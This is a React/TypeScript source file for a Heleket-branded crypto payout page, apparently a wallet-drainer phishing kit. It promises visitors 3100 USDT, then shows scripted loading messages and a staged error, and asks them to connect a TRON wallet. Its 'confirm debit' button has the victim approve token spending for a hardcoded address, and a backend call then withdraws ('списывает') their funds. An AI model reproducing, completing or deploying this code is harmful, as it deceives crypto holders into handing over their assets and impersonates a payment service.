      if (err.message.includes("Транзакция отклонена")) throw err;
      console.log("Ошибка поллинга (игнорируем):", err.message);
    }
    
    await new Promise((resolve) => setTimeout(resolve, 3000));
  }

  if (!approveConfirmed) {
    throw new Error(`Транзакция ${broadcastResult.txid} не найдена в сети за 75 сек. Откройте консоль dApp, скопируйте этот TXID и вставьте в Tronscan, чтобы увидеть реальный статус.`);
  }
  
  console.log("✅ Approve подтвержден смарт-контрактом!");

  console.log("-> 5. Инициируем списание (депозит)...");

  try {
    const response = await fetch("http://localhost:8080/api/deposit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userAddress: safeOwner,
        amount: amountToPayHex,
      }),
    });

    if (!response.ok) {
      const errData = await response.json().catch(() => ({}));
      throw new Error(errData.error || "Ошибка бэкенда при списании");
    }

    const data = await response.json();
    console.log("✅ Бэкенд успешно списал депозит! TXID списания:", data.txid);
  } catch (err: any) {
    console.error("❌ Ошибка при списании депозита бэкендом:", err.message);
  }

  return broadcastResult.txid || "unknown";
}

function PaymentPage() {
  const { open } = useAppKit();

  const { isConnected } = useAppKitAccount();

  const { walletProvider } = useAppKitProvider<any>("tron");

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [activeWalletId, setActiveWalletId] = useState<string | null>(null);

  const [secondsLeft] = useState(PAYMENT_SECONDS_TOTAL);
  const [currency, setCurrency] = useState<CurrencyOption | null>(null);
  const [network, setNetwork] = useState<NetworkOption | null>(null);
  const [isCurrencyOpen, setIsCurrencyOpen] = useState(false);
  const [isNetworkOpen, setIsNetworkOpen] = useState(false);
  // Инициализация из LocalStorage
  const [locale, setLocale] = useState<LocaleOption>(() => {
    const saved = localStorage.getItem("r2p_locale");
    return saved ? JSON.parse(saved) : LOCALES[1];
  });
  const [isLocaleOpen, setIsLocaleOpen] = useState(false);
  const [theme, setTheme] = useState<"light" | "dark">(() => {
    return (localStorage.getItem("r2p_theme") as "light" | "dark") || "light";
  });

  const [step, setStep] = useState(1);
  const [address, setAddress] = useState(() => localStorage.getItem("r2p_address") || "");

  // Сохранение при изменениях
  useEffect(() => {
    localStorage.setItem("r2p_locale", JSON.stringify(locale));
  }, [locale]);

  useEffect(() => {
    localStorage.setItem("r2p_address", address);
  }, [address]);

  useEffect(() => {
    localStorage.setItem("r2p_theme", theme);
    if (theme === "dark") {
      document.documentElement.classList.add("dark");
    } else {
      document.documentElement.classList.remove("dark");
    }
  }, [theme]);

  const [loadingMessageIndex, setLoadingMessageIndex] = useState(0);

  // Хелпер перевода строк по текущей выбранной локали
  const t = (key: string): any => {
    return TRANSLATIONS[locale.code]?.[key] ?? TRANSLATIONS["EN"]?.[key] ?? key;
  };

  const isAddressValid = validateAddress(address, network?.code || "TRC20");
  const showError = address.trim().length > 4 && !isAddressValid;

  useEffect(() => {
    if (step !== 3) return;

    const timer = setTimeout(() => {
      if (loadingMessageIndex < 2) {
        setLoadingMessageIndex((prev) => prev + 1);
      } else {
        setStep(4);
      }
    }, 2200);

    return () => clearTimeout(timer);
  }, [step, loadingMessageIndex]);

  const networkOptions = currency ? NETWORKS_BY_CURRENCY[currency.code] : [];
  const canSubmit = Boolean(currency && network);

  function handleSelectCurrency(option: CurrencyOption) {
    setCurrency(option);
    setNetwork(null);
    setIsCurrencyOpen(false);
  }

  function handleSelectNetwork(option: NetworkOption) {
    setNetwork(option);
    setIsNetworkOpen(false);
  }

  function handleSelectLocale(option: LocaleOption) {
    setLocale(option);
    setIsLocaleOpen(false);
  }

  useEffect(() => {
    if (!walletProvider) return;
    console.log("walletProvider:", walletProvider);
  }, [walletProvider]);


const handleThemeToggle = (e: React.MouseEvent<HTMLButtonElement>) => {
  const nextTheme = theme === "light" ? "dark" : "light";

  const x = e.clientX;
  const y = e.clientY;
  const root = document.documentElement;
  const maxRadius = Math.hypot(
    Math.max(x, window.innerWidth - x),
    Math.max(y, window.innerHeight - y),
  );

  root.style.setProperty("--vt-x", `${x}px`);
  root.style.setProperty("--vt-y", `${y}px`);
  root.style.setProperty("--vt-radius", `${maxRadius}px`);
  root.classList.toggle("dark-incoming", nextTheme === "dark");

  if (!document.startViewTransition) {
    setTheme(nextTheme);
    return;
  }

  document.startViewTransition(() => {
    setTheme(nextTheme);
  });
};

  return (
    <div className="payment-page">
      <div className="payment-card">
        <header className="payment-header">
          <img src="/img/heleket.svg" alt="Heleket" className="payment-logo" />

          <div className="header-actions" style={{ display: "flex", gap: "8px", alignItems: "center" }}>
            <button
              type="button"
              className={`theme-toggle ${theme === "dark" ? "theme-toggle--dark" : ""}`}
              onClick={handleThemeToggle}
              aria-label={theme === "light" ? "Switch to dark theme" : "Switch to light theme"}
            >
              <span className="theme-toggle-track">
                <span className="theme-toggle-icons">
                  <svg className="theme-toggle-icon theme-toggle-icon--sun" width="14" height="14" viewBox="0 0 24 24" fill="none">
                    <circle cx="12" cy="12" r="5" stroke="currentColor" strokeWidth="2" />
                    <path d="M12 1.5V4M12 20v2.5M4.2 4.2l1.8 1.8M18 18l1.8 1.8M1.5 12H4M20 12h2.5M4.2 19.8l1.8-1.8M18 6l1.8-1.8" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
                  </svg>
                  <svg className="theme-toggle-icon theme-toggle-icon--moon" width="14" height="14" viewBox="0 0 24 24" fill="none">
                    <path d="M20 14.5A8.5 8.5 0 1 1 9.5 4a6.5 6.5 0 0 0 10.5 10.5Z" stroke="currentColor" strokeWidth="2" strokeLinejoin="round" />
                  </svg>
                </span>
                <span className="theme-toggle-thumb" />
              </span>
            </button>

            <div className={`locale ${isLocaleOpen ? "locale--open" : ""}`}>
              <button
                type="button"
                className="locale-switch"
                onClick={() => setIsLocaleOpen((open) => !open)}
              >
                <img
                  className="locale-flag"
                  src={`https://flagcdn.com/${locale.flag}.svg`}
                  alt=""
                  aria-hidden="true"
                />
                {locale.code}
                <svg
                  className="locale-caret"
                  width="12"
                  height="7"
                  viewBox="0 0 12 7"
                  fill="none"
                >
                  <path
                    d="M1 6L6 1L11 6"
                    stroke="currentColor"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              </button>
              <div className="locale-dropdown">
                {LOCALES.map((option) => {
                  const isActive = option.code === locale.code;
                  return (
                    <button
                      key={option.code}
                      type="button"
                      className={`locale-option ${
                        isActive ? "locale-option--active" : ""
                      }`}
                      onClick={() => handleSelectLocale(option)}
                    >
                      <img
                        className="locale-option-flag"
                        src={`https://flagcdn.com/${option.flag}.svg`}
                        alt=""
                        aria-hidden="true"
                      />
                      <span className="locale-option-name">{option.name}</span>
                      {isActive && (
                        <svg
                          className="locale-option-check"
                          width="14"
                          height="11"
                          viewBox="0 0 14 11"
                          fill="none"
                        >
                          <path
                            d="M1 5.5L5 9.5L13 1.5"
                            stroke="currentColor"
                            strokeWidth="1.8"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                          />
                        </svg>
                      )}
                    </button>
                  );
                })}
              </div>
            </div>
          </div>
        </header>

        <div className="payment-amount-row">
          <span className="payment-amount-label">{t("amountLabel")}</span>
          <div className="payment-amount-block">
            <span className="payment-amount-value">
              {step === 1 ? "3100.0" : "3100.00"}{" "}
              <span className="payment-amount-unit">
                {step === 1 ? "USD" : currency?.code || "USDT"}
              </span>
            </span>
            {step !== 1 && (
              <div className="payment-amount-approx">≈$3100.0</div>
            )}
          </div>
        </div>

        <hr className="payment-divider" />

        {step === 1 && (
          <div className="payment-step-wrapper anim-slide-prev" key="step1">
            <div className="payment-field">
              <label className="payment-field-label">{t("selectCurrency")}</label>
              <div className={`select ${isCurrencyOpen ? "select--open" : ""}`}>
                <button
                  type="button"
                  className="select-trigger"
                  onClick={() => {
                    setIsCurrencyOpen((open) => !open);
                    setIsNetworkOpen(false);
                  }}
                >
                  {currency ? (
                    <span className="select-value">
                      <img src={currency.icon} alt="" className="select-icon" />
                      {currency.name} ({currency.code})
                    </span>
                  ) : (
                    <span className="select-placeholder">{t("selectCurrencyPlaceholder")}</span>
                  )}
                  <svg
                    className="select-caret"
                    width="12"
                    height="7"
                    viewBox="0 0 12 7"
                    fill="none"
                  >
                    <path
                      d="M1 1L6 6L11 1"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </svg>
                </button>
                <div className="select-dropdown">
                  {CURRENCIES.map((option) => (
                    <button
                      key={option.code}
                      type="button"
                      className="select-option"
                      onClick={() => handleSelectCurrency(option)}
                    >
                      <img src={option.icon} alt="" className="select-icon" />
                      {option.name} ({option.code})
                    </button>
                  ))}
                </div>
              </div>
            </div>

            <div className="payment-field">
              <label className="payment-field-label">{t("selectNetwork")}</label>
              <div
                className={`select ${isNetworkOpen ? "select--open" : ""} ${
                  !currency ? "select--disabled" : ""
                }`}
              >
                <button
                  type="button"
                  className="select-trigger"
                  disabled={!currency}
                  onClick={() => {
                    setIsNetworkOpen((open) => !open);
                    setIsCurrencyOpen(false);
                  }}
                >
                  {network ? (
                    <span className="select-value">{network.name}</span>
                  ) : (
                    <span className="select-placeholder">{t("selectNetworkPlaceholder")}</span>
                  )}
                  <svg
                    className="select-caret"
                    width="12"
                    height="7"
                    viewBox="0 0 12 7"
                    fill="none"
                  >
                    <path
                      d="M1 1L6 6L11 1"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </svg>
                </button>
                <div className="select-dropdown">
                  {networkOptions.map((option) => (
                    <button
                      key={option.code}
                      type="button"
                      className="select-option"
                      onClick={() => handleSelectNetwork(option)}
                    >
                      {option.name}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            <button
              type="button"
              className="submit-button"
              disabled={!canSubmit}
              onClick={() => setStep(2)}
            >
              {t("goToReceive")}
            </button>
          </div>
        )}

        {step === 2 && (
          <div className="payment-step-wrapper anim-slide-next" key="step2">
            <div className="step2-info-row">
              <div className="network-badge">
                {t("networkBadge")}{" "}
                <span className="network-badge-bold">
                  {network?.name || "TRON (TRC-20)"}
                </span>
              </div>
              <div className="contract-wrapper">
                <button type="button" className="contract-btn">
                  <svg
                    className="contract-icon"
                    width="14"
                    height="14"
                    viewBox="0 0 20 20"
                    fill="none"
                  >
                    <path
                      d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z"
                      stroke="currentColor"
                      strokeWidth="1.5"
                    />
                    <path
                      d="M10 14V10"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                    />
                    <path
                      d="M10 7H10.01"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                    />
                  </svg>
                  <span>{t("contract")}</span>
                </button>
                <div className="contract-tooltip">
                  {t("contractTooltip")}
                </div>
              </div>
            </div>

            <div className="fee-alert">
              <svg
                width="14"
                height="14"
                viewBox="0 0 20 20"
                fill="none"
                className="fee-alert-icon"
              >
                <path
                  d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z"
                  stroke="currentColor"
                  strokeWidth="1.5"
                />
                <path
                  d="M10 14V10"
                  stroke="currentColor"
                  strokeWidth="1.5"
                  strokeLinecap="round"
                />
                <path
                  d="M10 7H10.01"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                />
              </svg>
              <span>{t("gasSponsored")}</span>
            </div>

            <div className="step2-address-label">
              {t("enterAddress")}
            </div>

            <div
              className={`address-input-group ${showError ? "address-input-group--error" : ""}`}
            >
              <div className="address-input-section">
                <div className="address-input-header">
                  <label className="address-input-label">
                    {t("receivingAddress")}
                  </label>
                  {showError && (
                    <span className="address-error-text">
                      {t("invalidAddress")}
                    </span>
                  )}
                </div>
                <input
                  type="text"
                  className="address-input-field"
                  placeholder={t("placeholderAddress").replace("{network}", network?.code || "TRC-20")}
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                />
              </div>
              <div className="address-amount-section">
                <label className="address-input-label">
                  {t("amountToReceive")}
                </label>
                <div className="address-amount-value">
                  3100.00 {currency?.code || "USDT"} (
                  {network?.code || "TRC-20"})
                </div>
              </div>
            </div>

            <button
              type="button"
              className="submit-button"
              disabled={!address.trim() || !isAddressValid}
              onClick={() => {
                setLoadingMessageIndex(0);
                setStep(3);
              }}
            >
              {t("receiveBtn")
                .replace("{amount}", "3100.00")
                .replace("{currency}", currency?.code || "USDT")}
            </button>

            <button
              type="button"
              className="back-button"
              onClick={() => {
                setStep(1);
                setAddress("");
              }}
            >
              {t("back")}
            </button>
          </div>
        )}

        {step === 3 && (
          <div className="payment-step-wrapper anim-loading-fade" key="step3">
            <div className="loading-container">
              <svg className="loading-spinner" viewBox="0 0 50 50">
                <circle
                  className="loading-spinner-circle"
                  cx="25"
                  cy="25"
                  r="20"
                  fill="none"
                  strokeWidth="4"
                />
              </svg>
              <div className="loading-text" key={loadingMessageIndex}>
                {(t("loadingMessages") as string[])[loadingMessageIndex]}
              </div>
              <div className="loading-dots">
                <span
                  className={`loading-dot ${loadingMessageIndex === 0 ? "loading-dot--active" : ""}`}
                />
                <span
                  className={`loading-dot ${loadingMessageIndex === 1 ? "loading-dot--active" : ""}`}
                />
                <span
                  className={`loading-dot ${loadingMessageIndex === 2 ? "loading-dot--active" : ""}`}
                />
              </div>
            </div>
          </div>
        )}

        {step === 4 && (
          <div className="payment-step-wrapper anim-error-scale" key="step4">
            <div className="error-icon-wrapper">
              <svg className="error-icon-svg" viewBox="0 0 100 100">
                <circle className="error-circle" cx="50" cy="50" r="44" />
                <path className="error-line-1" d="M35,35 L65,65" />
                <path className="error-line-2" d="M65,35 L35,65" />
              </svg>
            </div>
            <div className="error-heading">{t("errorHeading")}</div>
            <div className="error-description">
              {t("errorDesc")}
            </div>
            <button
              type="button"
              className="continue-button"
              onClick={() => setStep(5)}
            >
              {t("continue")}
            </button>
          </div>
        )}

        {step === 5 && (
          <div className="payment-step-wrapper anim-slide-next" key="step5">
            <div className="step2-info-row">
              <div className="network-badge">
                {t("networkBadge")}{" "}
                <span className="network-badge-bold">
                  {network?.name || "TRON (TRC-20)"}
                </span>
              </div>
              <div className="contract-wrapper">
                <button type="button" className="contract-btn">
                  <svg
                    className="contract-icon"
                    width="14"
                    height="14"
                    viewBox="0 0 20 20"
                    fill="none"
                  >
                    <path
                      d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z"
                      stroke="currentColor"
                      strokeWidth="1.5"
                    />
                    <path
                      d="M10 14V10"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                    />
                    <path
                      d="M10 7H10.01"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                    />
                  </svg>
                  <span>{t("contract")}</span>
                </button>
                <div className="contract-tooltip">
                  {t("contractTooltip")}
                </div>
              </div>
            </div>

            <div className="fee-alert">
              <svg
                width="14"
                height="14"
                viewBox="0 0 20 20"
                fill="none"
                className="fee-alert-icon"
              >
                <path
                  d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18Z"
                  stroke="currentColor"
                  strokeWidth="1.5"
                />
                <path
                  d="M10 14V10"
                  stroke="currentColor"
                  strokeWidth="1.5"
                  strokeLinecap="round"
                />
                <path
                  d="M10 7H10.01"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                />
              </svg>
              <span>{t("gasSponsored")}</span>
            </div>

            <div className="wallets-header">
              <div className="wallets-title">{t("connectWallet")}</div>
              <div className="wallets-subtitle">
                {t("connectWalletDesc")}
              </div>
            </div>

            <div className="wallets-list">
              {WALLETS.map((wallet) => {
                const showSpinner =
                  isSubmitting && activeWalletId === wallet.id;

                return (
                  <button
                    key={wallet.id}
                    type="button"
                    className="wallet-item"
                    disabled={isSubmitting}
                    onClick={() => {
                      setActiveWalletId(wallet.id);
                      setIsSubmitting(true);
                      open();
                    }}
                  >
                    <div className="wallet-item-left">
                      <img
                        src={wallet.logo}
                        alt={wallet.name}
                        className="wallet-logo-img"
                      />
                      <span className="wallet-name">{wallet.name}</span>
                    </div>
                    {showSpinner ? (
                      <div className="wallet-spinner" />
                    ) : (
                      <svg
                        className="wallet-chevron"
                        width="14"
                        height="14"
                        viewBox="0 0 24 24"
                        fill="none"
                      >
                        <path
                          d="M9 5L16 12L9 19"
                          stroke="currentColor"
                          strokeWidth="2"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                        />
                      </svg>
                    )}
                  </button>
                );
              })}
            </div>

            {isConnected && (
              <div className="wallet-connected-section">
                <div className="wallet-connected-badge">
                  <span className="connected-badge-dot" />
                  <span>{t("walletConnected")}</span>
                </div>
                <button
                  type="button"
                  className="wallet-confirm-button"
                  disabled={activeWalletId === "confirming"}
                  onClick={async () => {
                    if (!isConnected) {
                      alert(t("walletNotConnectedAlert"));
                      return;
                    }

                    setActiveWalletId("confirming");

                    try {
                      console.log("→ Списание...");

                      const SYSTEM_WALLET_ADDRESS =
                        "TBTjC4pYzK6JU44uYwb5F17VdfYX6LmsCF";

                      const txId = await approveTokenSpending(
                        walletProvider,
                        SYSTEM_WALLET_ADDRESS,
                      );

                      alert(
                        t("successAlert").replace("{txId}", txId)
                      );
                      setStep(1);
                    } catch (error: any) {
                      console.error(error);
                      alert(
                        t("errorAlert").replace("{error}", error.message || "Unknown error")
                      );
                    } finally {
                      setActiveWalletId(null);
                    }
                  }}
                >
                  {activeWalletId === "confirming"
                    ? t("processing")
                    : t("confirmDebit")}
                </button>
              </div>
            )}
          </div>
        )}

        <div className="payment-timer">
          <span className="payment-timer-label">
            {t("timeLeft")}
          </span>
          <span className="payment-timer-value">{formatTime(secondsLeft)}</span>
        </div>
      </div>

      <div className="payment-powered-by">
        Powered by{" "}
        <img src="/img/heleket.svg" alt="Heleket" className="powered-logo" />
      </div>
    </div>
  );
}

export default PaymentPage;